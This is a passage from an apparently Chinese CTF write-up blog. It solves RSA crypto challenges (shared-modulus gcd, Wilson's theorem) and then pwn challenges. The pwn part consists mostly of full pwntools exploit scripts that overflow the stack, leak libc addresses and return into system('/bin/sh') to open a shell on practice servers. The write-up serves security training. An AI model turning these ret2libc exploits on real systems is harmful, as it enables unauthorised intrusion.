class="hljs-number">3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889</span><br><br><span class="hljs-attr">n</span> = <span class="hljs-number">26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346</span><br></code></pre></td></tr></table></figure><p>模不互素<br>找到俩组看gcd</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">print</span> gmpy2.gcd(n8,n5)</span><br>1325858063837986003054269573076125676042235626267641902113331362466437238110461493378529668287290524<br>7672555236113243737052154870766497712316527930505297186801275550916040864110054874404662151687798186<br>4180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472<br>464832499<br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">p=<span class="hljs-number">1325858063837986003054269573076125676042235626267641902113331362466437238110461493378529668287</span></span><br>2905247672555236113243737052154870766497712316527930505297186801275550916040864110054874404662151687<br>7981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601<br>618472464832499<br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">q = n8//p</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">c = <span class="hljs-number">38349170988872029319819687046591193416244322947593619195539375510534996074403332340181891419</span></span><br>7024630229938574254827858989603328289498120035327063712721348317218252989049590342564911675590163110<br>1665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190<br>2855211377856880756228329248292483627744764562328268858010469693845195493854282595915667168908446046<br>9625878363939085415303932948072620514719924718362153517245082597904713249543960384080650125499716705<br>1142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352<br>034177484688502364022887<br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">d=gmpy2.invert(<span class="hljs-number">65537</span>,phi)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m=<span class="hljs-built_in">pow</span>(c,d,n8)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)</span><br>flag&#123;abdcbe5fd94e23b3de429223ab9c2fdf&#125;<br></code></pre></td></tr></table></figure><h2 id="roarctf-rsa"><a href="#roarctf-rsa" class="headerlink" title="roarctf rsa"></a>roarctf rsa</h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">A</span>=(((y%x)**<span class="hljs-number">5</span>)%(x%y))**<span class="hljs-number">2019</span>+y**<span class="hljs-number">316</span>+(y+<span class="hljs-number">1</span>)/x<br><span class="hljs-attr">p</span>=next_prime(z*x*y)<br><span class="hljs-attr">q</span>=next_prime(z)<br><span class="hljs-attr">A</span> =  <span class="hljs-number">2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724</span><br><span class="hljs-attr">n</span> =  <span class="hljs-number">117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127</span><br><span class="hljs-attr">c</span> =  <span class="hljs-number">41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128</span><br></code></pre></td></tr></table></figure><p>题目很短主要还是通过A求得pq<br>通过开根号即可</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">y</span>=<span class="hljs-number">83</span><br><span class="hljs-attr">x</span>=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>下面就是约束爆破qp了</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">temp = gmpy2.iroot(n/<span class="hljs-number">166</span>,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65537</span>):</span><br><span class="hljs-meta">...</span> <span class="python">    a = gmpy2.next_prime(temp-i)</span><br><span class="hljs-meta">...</span> <span class="python">    <span class="hljs-keyword">if</span> n%a==<span class="hljs-number">0</span>:</span><br><span class="hljs-meta">...</span> <span class="python">        q = a</span><br><span class="hljs-meta">...</span> <span class="python">        p = n//q</span><br><span class="hljs-meta">...</span> <span class="python">        <span class="hljs-keyword">break</span></span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">d = gmpy2.invert(e,phi)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m = <span class="hljs-built_in">pow</span>(c,d,n)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)</span><br>&#x27;RoarCTF&#123;wm-l1l1ll1l1l1l111ll&#125;&#x27;<br></code></pre></td></tr></table></figure><h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import sympy<br>import random<br><br>def myGetPrime():<br>    A= getPrime(513)<br>    <span class="hljs-builtin-name">print</span>(A)<br>    <span class="hljs-attribute">B</span>=A-random.randint(1e3,1e5)<br>    <span class="hljs-builtin-name">print</span>(B)<br>    return sympy.nextPrime((B!)%A)<br><span class="hljs-attribute">p</span>=myGetPrime()<br><span class="hljs-comment">#A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span><br><span class="hljs-comment">#B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span><br><br><span class="hljs-attribute">q</span>=myGetPrime()<br><span class="hljs-comment">#A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span><br><span class="hljs-comment">#B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span><br><br><span class="hljs-attribute">r</span>=myGetPrime()<br><br><span class="hljs-attribute">n</span>=p*q*r<br><span class="hljs-comment">#n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span><br><span class="hljs-attribute">c</span>=pow(flag,e,n)<br><span class="hljs-comment">#e=0x1001</span><br><span class="hljs-comment">#c=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span><br><span class="hljs-comment">#so,what is the flag?</span><br></code></pre></td></tr></table></figure><p>Wilson’s theorem<br>当且仅当p为素数时：( p -1 )! ≡ -1 ( mod p )<br>可以观察发现A与B的差很小<br>通过构造求得pqr</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">myGetPrime</span>(<span class="hljs-params">a,b</span>):</span></span><br><span class="hljs-meta">...</span> <span class="python">    ans=<span class="hljs-number">1</span></span><br><span class="hljs-meta">...</span> <span class="python">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(b+<span class="hljs-number">1</span>,a):</span><br><span class="hljs-meta">...</span> <span class="python">        ans=(i*ans)%a</span><br><span class="hljs-meta">...</span><br><span class="hljs-meta">...</span> <span class="python">    ans *= -<span class="hljs-number">1</span></span><br><span class="hljs-meta">...</span> <span class="python">    s = gmpy2.invert(ans,a)</span><br><span class="hljs-meta">...</span> <span class="python">    <span class="hljs-keyword">return</span> gmpy2.next_prime(s)</span><br><span class="hljs-meta">...</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">p = myGetPrime(A1,B1)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">q = myGetPrime(A2,B2)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">r = n//p//q</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)*(r-<span class="hljs-number">1</span>)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">d = gmpy2.invert(e,phi)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m = <span class="hljs-built_in">pow</span>(c,d,n)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)</span><br>&#x27;RoarCTF&#123;wm-CongrAtu1ation4-1t4-ju4t-A-bAby-R4A&#125;&#x27;<br></code></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><p><img src="37.png" alt="37"><br>gets函数很明显的栈溢出<br>这边有个加密部分。。。其实可以构造\0直接绕过strlen<br>这样就不需要加密了<br>泄露puts的got表地址后搜索libc即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">from</span> LibcSearcher import *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-attribute">debug</span> = <span class="hljs-number">1</span><br><span class="hljs-attribute">if</span> debug == <span class="hljs-number">1</span>:<br>    <span class="hljs-attribute">a</span> = process(<span class="hljs-string">&quot;./rop&quot;</span>)<br><span class="hljs-attribute">else</span>:<br>    <span class="hljs-attribute">a</span> = remote(&#x27;node<span class="hljs-number">3</span>.buuoj.cn&#x27;,<span class="hljs-number">29305</span>)<br><br><span class="hljs-attribute">elf</span> = ELF(<span class="hljs-string">&quot;rop&quot;</span>)<br><span class="hljs-attribute">p_r</span> = <span class="hljs-number">0</span>x<span class="hljs-number">400</span>c<span class="hljs-number">83</span><br><span class="hljs-attribute">a</span>.recvuntil(<span class="hljs-string">&quot;choice!&quot;</span>)<br><span class="hljs-attribute">a</span>.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><span class="hljs-attribute">temp</span> = &#x27;a&#x27;*<span class="hljs-number">87</span> + &#x27;\<span class="hljs-number">0</span>&#x27; + p<span class="hljs-number">64</span>(p_r) + p<span class="hljs-number">64</span>(elf.got[&#x27;puts&#x27;]) + p<span class="hljs-number">64</span>(elf.plt[&#x27;puts&#x27;])<br><span class="hljs-attribute">temp</span> += p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>x<span class="hljs-number">400</span>B<span class="hljs-number">28</span>)<br><span class="hljs-attribute">pay</span> = &#x27;&#x27;<br><span class="hljs-attribute">a</span>.recvuntil(<span class="hljs-string">&quot;encrypted&quot;</span>)<br><span class="hljs-comment">#gdb.attach(a)</span><br><span class="hljs-attribute">a</span>.sendline(temp)<br><span class="hljs-attribute">print</span> a.recvline()<br><span class="hljs-attribute">print</span> a.recvline()<br><span class="hljs-attribute">print</span> a.recvline()<br><span class="hljs-attribute">puts</span> = u<span class="hljs-number">64</span>(a.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,&#x27;\<span class="hljs-number">0</span>&#x27;))<br><span class="hljs-attribute">print</span> hex(puts)<br><span class="hljs-attribute">libc</span> = LibcSearcher(&#x27;puts&#x27;, puts)<br><span class="hljs-attribute">libc_base</span> = puts - libc.dump(&#x27;puts&#x27;)<br><span class="hljs-attribute">sys</span> = libc_base+libc.dump(&#x27;execve&#x27;)<br><span class="hljs-attribute">bash</span> = libc_base+libc.dump(&#x27;str_bin_sh&#x27;)<br><span class="hljs-attribute">a</span>.recvuntil(<span class="hljs-string">&quot;choice!&quot;</span>)<br><span class="hljs-attribute">a</span>.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><span class="hljs-attribute">p_2</span>=<span class="hljs-number">0</span>x<span class="hljs-number">400</span>c<span class="hljs-number">81</span><br><span class="hljs-attribute">temp</span> = &#x27;&#x27;<br><span class="hljs-attribute">temp</span> += &#x27;a&#x27;*<span class="hljs-number">87</span> + &#x27;\<span class="hljs-number">0</span>&#x27; + p<span class="hljs-number">64</span>(p_r) + p<span class="hljs-number">64</span>(bash) + p<span class="hljs-number">64</span>(p_<span class="hljs-number">2</span>) + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>) + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>) + p<span class="hljs-number">64</span>(sys)<br><span class="hljs-attribute">a</span>.recvuntil(<span class="hljs-string">&quot;encrypted&quot;</span>)<br><span class="hljs-comment">#gdb.attach(a)</span><br><span class="hljs-attribute">a</span>.sendline(temp)<br><span class="hljs-attribute">a</span>.interactive()<br></code></pre></td></tr></table></figure><p><img src="38.png" alt="38"></p><h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>gets溢出后修改对应的浮点数即可</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><span class="hljs-built_in">from</span> LibcSearcher import *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">a</span> = <span class="hljs-built_in">process</span>(<span class="hljs-string">&quot;./ciscn_2019_n_1&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">a</span> = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25753</span>)<br><br><span class="hljs-comment">#a.recvuntil(&quot;number.&quot;)</span><br>pay = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">44</span> + p64(<span class="hljs-number">0x41348000</span>)<br><span class="hljs-keyword">a</span>.sendline(pay)<br><span class="hljs-keyword">a</span>.interactive()<br></code></pre></td></tr></table></figure><h2 id="ogeek-babyrop"><a href="#ogeek-babyrop" class="headerlink" title="ogeek babyrop"></a>ogeek babyrop</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><span class="hljs-built_in">from</span> LibcSearcher import *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">a</span> = <span class="hljs-built_in">process</span>(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">a</span> = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27215</span>)<br>elf = ELF(<span class="hljs-string">&quot;pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;libc-2.23.so&quot;</span>)<br>pay = <span class="hljs-string">&#x27;\0&#x27;</span> + <span class="hljs-string">&#x27;\xff&#x27;</span>*<span class="hljs-number">10</span><br><span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(pay)<br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>pay = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xe7</span> + <span class="hljs-string">&#x27;aaaa&#x27;</span> + p32(elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(<span class="hljs-number">0x8048825</span>) + p32(<span class="hljs-number">1</span>) + p32(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#gdb.attach(a)</span><br><span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(pay)<br><span class="hljs-built_in">write</span> = u32(<span class="hljs-keyword">a</span>.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>print hex(<span class="hljs-built_in">write</span>)<br>sys = <span class="hljs-built_in">write</span> - libc.symbols[<span class="hljs-string">&quot;write&quot;</span>] + libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>bash = <span class="hljs-built_in">write</span> - libc.symbols[<span class="hljs-string">&quot;write&quot;</span>] + libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>).next()<br><br>pay = <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">4</span> + <span class="hljs-string">&#x27;\xff&#x27;</span>*<span class="hljs-number">10</span><br><span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(pay)<br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>pay = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xe7</span> + <span class="hljs-string">&#x27;aaaa&#x27;</span> + p32(sys) + p32(sys) + p32(bash) + p32(bash)<br><br><span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(pay)<br><span class="hljs-comment">#gdb.attach(a)</span><br><span class="hljs-keyword">a</span>.interactive()<br></code></pre></td></tr></table></figure><h3 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h3><p>打法很多<br>ropchain是第一想法<br>后来看到了后门也可以利用</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 